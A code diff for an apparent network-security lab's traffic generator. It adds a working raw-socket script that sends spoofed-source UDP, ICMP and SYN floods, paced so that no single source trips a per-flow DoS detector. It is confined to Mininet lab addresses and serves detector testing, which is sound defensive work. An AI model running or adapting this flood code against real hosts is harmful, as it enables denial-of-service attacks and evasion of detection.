@@ -98,6 +98,73 @@ def stop_multi_connection_listener(host: Any, pid: str) -> None:
     host.cmd(f"kill {pid} 2>/dev/null || true")
 
 
+# Sources for the distributed-attack variants: the attacker host's own real
+# address plus five spoofed ones, all sent from that one physical host. Real
+# address first so a response keyed on the attacker's identity (BLOCK_SOURCE,
+# DECOY, BANDWIDTH_CAP) is a genuine action on one of the N sources.
+DISTRIBUTED_SOURCE_IPS: tuple[str, ...] = (
+    "10.0.0.100", "10.0.0.121", "10.0.0.122", "10.0.0.123", "10.0.0.124", "10.0.0.125",
+)
+
+# Runs inside a Mininet host namespace (system python3, no third-party
+# imports): sends paced, raw IP packets whose source address is taken
+# round-robin from SOURCES. UDP and ICMP are fire-and-forget; TCP is SYN-only,
+# since a handshake cannot complete toward a spoofed address.
+_SPOOFED_FLOOD_SCRIPT = """import socket, struct, time
+PROTOCOL = '__PROTOCOL__'
+SOURCES = __SOURCES__
+TARGET = '__TARGET__'
+DST_PORT = __DST_PORT__
+DURATION = __DURATION__
+TOTAL_PPS = __TOTAL_PPS__
+PAYLOAD = b'x' * __PAYLOAD_SIZE__
+
+def checksum(data):
+    if len(data) % 2:
+        data += b'\\x00'
+    total = sum((data[i] << 8) + data[i + 1] for i in range(0, len(data), 2))
+    total = (total >> 16) + (total & 0xffff)
+    total += total >> 16
+    return (~total) & 0xffff
+
+def ip_header(src, dst, proto, payload_len, ident):
+    fields = (0x45, 0, 20 + payload_len, ident, 0, 64, proto)
+    addrs = (socket.inet_aton(src), socket.inet_aton(dst))
+    partial = struct.pack('!BBHHHBBH4s4s', *fields, 0, *addrs)
+    return struct.pack('!BBHHHBBH4s4s', *fields, checksum(partial), *addrs)
+
+def build(src, seq):
+    if PROTOCOL == 'UDP':
+        body = struct.pack('!HHHH', 51000 + seq % 1000, DST_PORT, 8 + len(PAYLOAD), 0) + PAYLOAD
+        proto = socket.IPPROTO_UDP
+    elif PROTOCOL == 'ICMP':
+        header = struct.pack('!BBHHH', 8, 0, 0, 4242, seq & 0xffff)
+        body = header[:2] + struct.pack('!H', checksum(header + PAYLOAD)) + header[4:] + PAYLOAD
+        proto = socket.IPPROTO_ICMP
+    else:
+        tcp = struct.pack('!HHLLBBHHH', 40000 + seq % 20000, DST_PORT, 1000 + seq, 0, 5 << 4, 0x02, 1024, 0, 0)
+        pseudo = socket.inet_aton(src) + socket.inet_aton(TARGET) + struct.pack('!BBH', 0, socket.IPPROTO_TCP, len(tcp))
+        body = tcp[:16] + struct.pack('!H', checksum(pseudo + tcp)) + tcp[18:]
+        proto = socket.IPPROTO_TCP
+    return ip_header(src, TARGET, proto, len(body), 2000 + seq % 60000) + body
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+start = time.time()
+total = int(DURATION * TOTAL_PPS)
+sent = 0
+while sent < total:
+    due = start + sent / TOTAL_PPS
+    now = time.time()
+    if now < due:
+        time.sleep(due - now)
+    sock.sendto(build(SOURCES[sent % len(SOURCES)], sent), (TARGET, 0))
+    sent += 1
+sock.close()
+print('__MARKER__')
+"""
+
+
 class TrafficGenerator:
     """Generate a small set of benign and malicious traffic events for testing."""
 
@@ -986,6 +1053,75 @@ class TrafficGenerator:
             "spoofed_sources": list(sources),
             "output": attacker.cmd(command),
         }
+
+    @staticmethod
+    def _spoofed_raw_flood_command(
+        *, protocol: str, sources: tuple[str, ...], target_ip: str, dst_port: int,
+        duration_seconds: float, total_pps: int, payload_size: int, marker: str,
+    ) -> str:
+        script = (
+            _SPOOFED_FLOOD_SCRIPT.replace("__PROTOCOL__", protocol)
+            .replace("__SOURCES__", repr(list(sources)))
+            .replace("__TARGET__", target_ip)
+            .replace("__DST_PORT__", str(dst_port))
+            .replace("__DURATION__", str(duration_seconds))
+            .replace("__TOTAL_PPS__", str(total_pps))
+            .replace("__PAYLOAD_SIZE__", str(payload_size))
+            .replace("__MARKER__", marker)
+        )
+        return "python3 - <<'PY'\n" + script + "\nPY"
+
+    def _generate_distributed_flood(
+        self, net: Any, *, protocol: str, sources: tuple[str, ...], dst_port: int,
+        duration_seconds: float, total_pps: int, payload_size: int, marker: str,
+    ) -> dict[str, Any]:
+        attacker = net.get("attacker")
+        target_ip = "10.0.0.10"
+        command = self._spoofed_raw_flood_command(
+            protocol=protocol, sources=sources, target_ip=target_ip, dst_port=dst_port,
+            duration_seconds=duration_seconds, total_pps=total_pps, payload_size=payload_size, marker=marker,
+        )
+        return {
+            "attacker": attacker.name,
+            "target": target_ip,
+            "spoofed_sources": list(sources),
+            "output": attacker.cmd(command),
+        }
+
+    def generate_dos_distributed_mininet_traffic(
+        self, net: Any, duration_seconds: float = 4, sources: tuple[str, ...] = DISTRIBUTED_SOURCE_IPS
+    ) -> dict[str, Any]:
+        """A UDP flood spread across several source addresses (one real, the
+        rest spoofed), all sent from the single attacker host. Paced at 300
+        packets/s in total, so each source alone stays at ~50/s -- a level the
+        per-flow DoS detector never sees as a flood. Entirely confined to the
+        Mininet lab and bounded by duration_seconds."""
+        return self._generate_distributed_flood(
+            net, protocol="UDP", sources=sources, dst_port=9999, duration_seconds=duration_seconds,
+            total_pps=300, payload_size=64, marker="dos_distributed_done",
+        )
+
+    def generate_syn_flood_distributed_mininet_traffic(
+        self, net: Any, duration_seconds: float = 4, sources: tuple[str, ...] = DISTRIBUTED_SOURCE_IPS
+    ) -> dict[str, Any]:
+        """A SYN-only TCP flood across several source addresses (100 SYN/s in
+        total). SYN-only because a handshake cannot complete toward a
+        spoofed address -- the same reason brute_force has no spoofed
+        variant. Entirely confined to the Mininet lab."""
+        return self._generate_distributed_flood(
+            net, protocol="TCP", sources=sources, dst_port=8080, duration_seconds=duration_seconds,
+            total_pps=100, payload_size=0, marker="syn_flood_distributed_done",
+        )
+
+    def generate_icmp_flood_distributed_mininet_traffic(
+        self, net: Any, duration_seconds: float = 4, sources: tuple[str, ...] = DISTRIBUTED_SOURCE_IPS
+    ) -> dict[str, Any]:
+        """An ICMP echo flood across several source addresses (100 packets/s
+        in total). Entirely confined to the Mininet lab."""
+        return self._generate_distributed_flood(
+            net, protocol="ICMP", sources=sources, dst_port=0, duration_seconds=duration_seconds,
+            total_pps=100, payload_size=56, marker="icmp_flood_distributed_done",
+        )
 
     def generate_rogue_beacon_mininet_traffic(self, net: Any, duration_seconds: int = 10) -> dict[str, Any]:
         """Generate a bounded rogue-configuration-beacon attempt: an
